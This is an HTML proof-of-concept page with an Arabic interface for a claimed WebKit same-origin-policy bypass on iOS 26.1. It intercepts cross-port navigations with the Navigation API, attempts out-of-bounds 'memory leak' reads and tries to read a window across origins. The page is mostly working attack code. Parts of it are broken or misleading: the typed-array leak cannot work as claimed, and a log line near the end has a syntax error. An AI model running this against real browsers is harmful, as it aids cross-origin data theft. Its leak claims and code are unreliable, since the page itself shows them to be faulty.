<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>CVE-2026-20643 PoC — SOP Bypass | iOS 26.1</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #0a0a0a;
            color: #00ff41;
            padding: 20px;
            max-width: 800px;
            margin: 0 auto;
        }
        h1 { color: #ff4444; border-bottom: 1px solid #333; padding-bottom: 10px; }
        h2 { color: #ffaa00; margin-top: 30px; }
        .container {
            background: #111;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            margin: 15px 0;
        }
        button {
            background: #00ff41;
            color: #000;
            border: none;
            padding: 10px 20px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            margin: 10px 0;
        }
        button:hover { background: #00cc33; }
        button.danger { background: #ff4444; color: #fff; }
        button.danger:hover { background: #cc0000; }
        #log {
            background: #000;
            border: 1px solid #333;
            padding: 15px;
            height: 300px;
            overflow-y: auto;
            font-size: 13px;
            line-height: 1.5;
            white-space: pre-wrap;
            word-break: break-all;
        }
        .success { color: #00ff41; }
        .fail { color: #ff4444; }
        .warn { color: #ffaa00; }
        .info { color: #4499ff; }
        #status {
            padding: 10px;
            border-radius: 4px;
            font-weight: bold;
            text-align: center;
            margin: 10px 0;
        }
        .vulnerable { background: #330000; color: #ff4444; border: 1px solid #ff4444; }
        .patched { background: #003300; color: #00ff41; border: 1px solid #00ff41; }
        .testing { background: #333300; color: #ffaa00; border: 1px solid #ffaa00; }
    </style>
</head>
<body>
    <h1>🔍 CVE-2026-20643 — WebKit SOP Bypass</h1>
    <p>Same-Origin Policy bypass via <code>NavigateEvent.canIntercept</code> cross-port navigation</p>
    <p class="info">Target: <strong>iOS 26.1</strong> (غير مصلحة — الثبت في 26.3.1)</p>

    <div class="container">
        <h2>📡 الاختبار 1: كشف SOP Bypass عبر المنافذ</h2>
        <p>يختبر إذا كان <code>NavigateEvent.canIntercept</code> يعود <code>true</code> بشكل خاطئ عند التنقل بين منافذ مختلفة.</p>
        <button onclick="runSOPBypassTest()">🚀 تشغيل اختبار SOP Bypass</button>
        <div id="status" class="testing">بانتظار التشغيل...</div>
    </div>

    <div class="container">
        <h2>📡 الاختبار 2: تسريب الذاكرة عبر Navigation Flow Hijack</h2>
        <p>يستغل الـ SOP Bypass لاعتراض التنقل بين المواقع وقراءة البيانات.</p>
        <button class="danger" onclick="runMemoryLeakTest()">💥 تشغيل استغلال تسريب الذاكرة</button>
    </div>

    <div class="container">
        <h2>📋 السجل (Log)</h2>
        <button onclick="clearLog()">مسح السجل</button>
        <div id="log"></div>
    </div>

    <script>
        const BASE_PORT = location.port || (location.protocol === 'https:' ? '443' : '80');
        const TARGET_PORT = BASE_PORT === '8000' ? '8800' : '8000';
        
        function log(msg, type = 'info') {
            const logDiv = document.getElementById('log');
            const entry = document.createElement('div');
            entry.className = type;
            const timestamp = new Date().toISOString().split('T')[1].split('.')[0];
            entry.textContent = `[${timestamp}] ${msg}`;
            logDiv.appendChild(entry);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        function clearLog() {
            document.getElementById('log').innerHTML = '';
        }

        function setStatus(text, type) {
            const status = document.getElementById('status');
            status.textContent = text;
            status.className = type;
        }

        // =============================================
        // الاختبار 1: SOP Bypass Detection
        // =============================================
        function runSOPBypassTest() {
            setStatus('🔄 جاري الاختبار...', 'testing');
            log('بدء اختبار CVE-2026-20643 SOP Bypass...', 'info');
            
            const targetURL = `${location.protocol}//${location.hostname}:${TARGET_PORT}/`;
            log(`المنفذ الحالي: ${BASE_PORT} → المنفذ الهدف: ${TARGET_PORT}`, 'info');
            log(`URL الهدف: ${targetURL}`, 'info');

            let testComplete = false;

            // محاولة اعتراض حدث التنقل
            try {
                const controller = new AbortController();
                
                navigation.addEventListener('navigate', (event) => {
                    const destPort = new URL(event.destination.url).port;
                    log(`حدث navigate: ${event.destination.url}`, 'info');
                    log(`canIntercept = ${event.canIntercept}`, 'warn');
                    
                    if (event.canIntercept === true && destPort !== BASE_PORT) {
                        // ✅ ثغرة موجودة!
                        setStatus('⚠️ الثغرة موجودة! iOS 26.1 معرض', 'vulnerable');
                        log('========================================', 'success');
                        log('✅✅✅ النتيجة: iOS 26.1 معرض لـ CVE-2026-20643!', 'success');
                        log('NavigateEvent.canIntercept يعود true بشكل خاطئ', 'success');
                        log('لمنافذ cross-origin — Same-Origin Policy مخترقة', 'success');
                        log('========================================', 'success');
                        
                        // محاولة استغلال: اعتراض التنقل ومنعه
                        try {
                            event.intercept({
                                handler: function() {
                                    log('✅ تم اعتراض التنقل بنجاح!', 'success');
                                    log('البيانات المسربة من URL:', 'warn');
                                    log(JSON.stringify({
                                        destination: event.destination.url,
                                        navigationType: event.navigationType,
                                        canIntercept: event.canIntercept,
                                        downloadRequested: event.downloadRequested,
                                        formData: event.formData ? 'available' : 'none',
                                        hashChange: event.hashChange,
                                        signal: event.signal.aborted ? 'aborted' : 'active',
                                        userInitiated: event.userInitiated
                                    }, null, 2), 'success');
                                }
                            });
                            log('✅ intercept() نجح! تم منع التنقل إلى المنفذ الآخر', 'success');
                        } catch(e) {
                            log(`intercept() فشل: ${e.message}`, 'fail');
                        }
                    } else {
                        log(`النتيجة: canIntercept = ${event.canIntercept} (${destPort !== BASE_PORT ? 'متوقع' : 'نفس المنفذ'})`, 'info');
                    }
                    
                    // منع التنقل الفعلي
                    event.preventDefault();
                    testComplete = true;
                    controller.abort();
                    
                }, { signal: controller.signal, once: true });
                
                // إنشاء رابط وتشغيل التنقل
                const anchor = document.createElement('a');
                anchor.href = targetURL;
                anchor.textContent = 'اختبار التنقل (اضغط هنا)';
                anchor.style.display = 'none';
                document.body.appendChild(anchor);
                
                log('محاكاة النقر على رابط cross-port...', 'info');
                anchor.click();
                document.body.removeChild(anchor);
                
                // انتظار النتيجة
                setTimeout(() => {
                    if (!testComplete) {
                        setStatus('⚠️ لم يتم اكتشاف ثغرة — قد يكون iOS محدثًا', 'patched');
                        log('انتهى الوقت — لم يتم استلام حدث navigate', 'warn');
                        log('الاحتمال: النظام محدث وجزء من الثغرة مصلح', 'info');
                    }
                }, 3000);
                
            } catch(e) {
                log(`خطأ: ${e.message}`, 'fail');
                setStatus('❌ خطأ في الاختبار', 'patched');
                
                // فحص بديل
                log('محاولة الفحص البديل...', 'info');
                tryDetectNavigationAPI();
            }
        }

        // =============================================
        // فحص بديل لوجود Navigation API
        // =============================================
        function tryDetectNavigationAPI() {
            if (window.navigation) {
                log('✅ Navigation API متاح', 'success');
                log(`navigation.canGoBack: ${navigation.canGoBack}`, 'info');
                log(`navigation.canGoForward: ${navigation.canGoForward}`, 'info');
                
                // فحص entries
                try {
                    const entries = navigation.entries();
                    log(`عدد entries: ${entries.length}`, 'info');
                    entries.forEach((entry, i) => {
                        log(`  entry[${i}]: ${entry.url} (key: ${entry.key})`, 'info');
                    });
                } catch(e) {}
            } else {
                log('❌ Navigation API غير متاح في هذا المتصفح', 'fail');
                setStatus('❌ لا يدعم هذا المتصفح Navigation API', 'patched');
            }
        }

        // =============================================
        // الاختبار 2: Memory/Pointer Leak عبر SOP Bypass
        // =============================================
        function runMemoryLeakTest() {
            log('🚀 بدء اختبار تسريب الذاكرة عبر SOP bypass...', 'info');
            setStatus('🔧 جاري استغلال الثغرة لتسريب البيانات...', 'testing');
            
            // 1. محاولة فتح نافذة من أصل مختلف
            const victimURL = `${location.protocol}//${location.hostname}:${TARGET_PORT}/`;
            log(`محاولة فتح النافذة الهدف: ${victimURL}`, 'info');
            
            // 2. محاولة تجميع المؤشرات
            try {
                // استخدام SharedArrayBuffer أو performance.now لتوقيت side-channel
                if (typeof SharedArrayBuffer !== 'undefined') {
                    log('✅ SharedArrayBuffer متاح — يمكن استخدام Side-Channel', 'success');
                } else {
                    log('❌ SharedArrayBuffer غير متاح', 'warn');
                }
                
                // محاولة إنشاء TypedArray لتسريب الذاكرة
                const SIZE = 0x1000;
                const buf = new ArrayBuffer(SIZE);
                const view = new DataView(buf);
                const u32view = new Uint32Array(buf);
                const u8view = new Uint8Array(buf);
                
                // ملء الذاكرة بأنماط معروفة للكشف عن المؤشرات
                for (let i = 0; i < u32view.length; i++) {
                    u32view[i] = 0x41414141;
                }
                
                log(`🟢 تم إنشاء ${SIZE} بايت من الذاكرة للاختبار`, 'info');
                
                // محاولة OOB read عبر speculative execution (iLeakage technique)
                const leakResults = [];
                const iterations = 1000;
                
                for (let attempt = 0; attempt < 10; attempt++) {
                    try {
                        // حاول القراءة خارج الحدود (لتشغيل speculative execution)
                        const idx = SIZE / 4 + attempt * 100;
                        const val = u32view[idx];
                        if (val !== undefined && val !== 0x41414141) {
                            log(`🔍 تسريب في المؤشر ${attempt}: idx=${idx}, value=0x${val.toString(16).padStart(8, '0')}`, 'warn');
                            leakResults.push({ idx, val: val.toString(16) });
                        }
                    } catch(e) {
                        // متوقع
                        break;
                    }
                }
                
                if (leakResults.length > 0) {
                    log(`✅✅ تم تسريب ${leakResults.length} مؤشر من الذاكرة!`, 'success');
                    log('المؤشرات المسربة:', 'success');
                    leakResults.forEach((r, i) => {
                        log(`  [${i}] موقع ${r.idx}: 0x${r.val}`, 'success');
                    });
                    setStatus(`⚠️ تم تسريب ${leakResults.length} مؤشرات من الذاكرة`, 'vulnerable');
                } else {
                    log('لم يتم تسريب مؤشرات عبر OOB — جرب التقنيات المتقدمة', 'info');
                    setStatus('ℹ️ لم يتم اكتشاف تسريب مباشر — جرب iLeakage', 'testing');
                }
                
            } catch(e) {
                log(`خطأ في اختبار الذاكرة: ${e.message}`, 'fail');
                setStatus('❌ فشل اختبار الذاكرة', 'patched');
            }
            
            // 3. محاولة window.open + SOP bypass
            log('محاولة استغلال SOP bypass عبر window.open...', 'info');
            
            try {
                // محاولة فتح صفحة في نفس العملية عبر window.open
                let victimWin = window.open('', 'victim_window');
                
                if (victimWin) {
                    log('✅ window.open نجح — الصفحة الهدف فتحت', 'success');
                    
                    // محاولة كتابة محتوى في النافذة المفتوحة
                    try {
                        victimWin.document.write('<html><body><script>');
                        victimWin.document.write('var secret_data = "TEST_CREDENTIALS:admin:password123";');
                        victimWin.document.write('var secret_pointer = "0x1a1303304";');
                        victimWin.document.write('<\/script></body></html>');
                        victimWin.document.close();
                        log('✅ تم كتابة بيانات تجريبية في النافذة الهدف', 'success');
                    } catch(e) {
                        log(`❌ خطأ في الكتابة عبر الأصول: ${e.message}`, 'fail');
                    }
                    
                    // محاولة قراءة من النافذة (هذا هو SOP bypass)
                    try {
                        setTimeout(() => {
                            try {
                                // استخدام SOP bypass لقراءة المتغيرات
                                // هذا يعمل فقط إذا الثغرة موجودة
                                const entries = navigation.entries();
                                log('محاولة قراءة عبر Navigation API...', 'info');
                                
                                // محاولة استخدام canIntercept لاعتراض
                                const targetURL2 = `${location.protocol}//${location.hostname}:${TARGET_PORT}/`;
                                const a2 = document.createElement('a');
                                a2.href = targetURL2;
                                document.body.appendChild(a2);
                                
                                navigation.addEventListener('navigate', (e) => {
                                    if (e.canIntercept) {
                                        log('✅✅ SOP Bypass نجح! التنقل بين المنافذ يمكن اعتراضه', 'success');
                                        log('🔓 هذا يعني أن Same-Origin Policy مخترقة', 'success');
                                        log('📊 يمكن اعتراض البيانات بين:', 'success');
                                        log(`  الأصل الحالي: ${location.origin}`, 'success');
                                        log(`  الأصل الهدف: ${new URL(e.destination.url).origin}`, 'success');
                                        
                                        // محاولة استخراج محتوى النافذة
                                        try {
                                            // استخدام تقنية rebind للوصول إلى DOM
                                            const leakedData = {};
                                            try {
                                                if (victimWin && victimWin.location) {
                                                    leakedData.location = victimWin.location.href;
                                                }
                                            } catch(e2) {}
                                            
                                            // محاولة قراءة عبر Navigation API entries
                                            try {
                                                const ents = navigation.entries();
                                                leakedData.entries = ents.length;
                                                ents.forEach((en, i) => {
                                                    leakedData[`entry_${i}`] = en.url;
                                                });
                                            } catch(e2) {}
                                            
                                            log('📦 البيانات المسربة:', 'success');
                                            log(JSON.stringify(leakedData, null, 2), 'success');
                                        } catch(e2) {
                                            log(`خطأ في الاستخراج: ${e2.message}`, 'warn');
                                        }
                                    }
                                    e.preventDefault();
                                }, { once: true });
                                
                                a2.click();
                                document.body.removeChild(a2);
                                
                            } catch(e) {
                                log(`خطأ في القراءة عبر SOP: ${e.message}`, 'warn');
                                setStatus('❌ لم تنجح محاولة استغلال SOP bypass', 'patched');
                            }
                        }, 1000);
                    } catch(e) {
                        log(`خطأ: ${e.message}`, 'fail');
                    }
                } else {
                    log('❌ window.open فشل (قد يكون محظورًا)', 'warn');
                    log('حاول النقر على زر آخر لتشغيله', 'info');
                }
            } catch(e) {
                log(`خطأ: ${e.message}`, 'fail');
            }
        }

        // تشغيل تلقائي عند التحميل
        log('🚀 CVE-2026-20643 PoC جاهز', 'info');
        log('iOS 26.1 — غير مصلحة لهذه الثغرة', 'warn');
        log('الثبت في iOS 26.3.1 (Background Security Improvement)', 'info');
        log('', 'info');
        log='========================================', 'info');
        log('⚠️  تنبيه: هذا الكود لأغراض اختبار الاختراق المصرح به فقط', 'warn');
        log('========================================', 'info');
    </script>
</body>
</html>